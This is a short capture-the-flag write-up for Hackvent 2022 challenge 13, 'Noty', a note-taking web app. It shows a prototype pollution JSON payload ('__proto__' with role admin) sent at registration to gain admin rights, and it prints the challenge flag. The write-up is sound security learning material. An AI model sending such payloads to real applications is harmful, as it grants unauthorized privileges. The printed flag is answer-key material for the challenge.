# 13 - Noty

## Description

Level: Medium<br/>
Author: HaCk0

After the previous fiasco with multiple bugs in Notme (some intended and some not), Santa released a now truly secure
note taking app for you. Introducing: Noty, a fixed version of Notme.

Also Santa makes sure that this service runs on green energy. No pollution from this app ;)

## Solution

We are given a fixed version of [challenge 10](../10/). This time, however, we cannot simply change the password of
a different user. Instead, we get a 403 response code:

```
{"msg":"Not allowed to change other users"}
```

The description gives us a hint into the right direction though. We are supposed to use some kind of [Prototype
Pollution](https://portswigger.net/web-security/prototype-pollution/what-is-prototype-pollution). The pollution exploit
can be used with several endpoints. I used it during the registration:

```
{"username":"test","password":"test" "__proto__":{"role": "admin"}}
```

This sets the role of our newly registered user to `admin` and we are able to see the flag
`HV22{P0luT1on_1S_B4d_3vERyWhere}`.
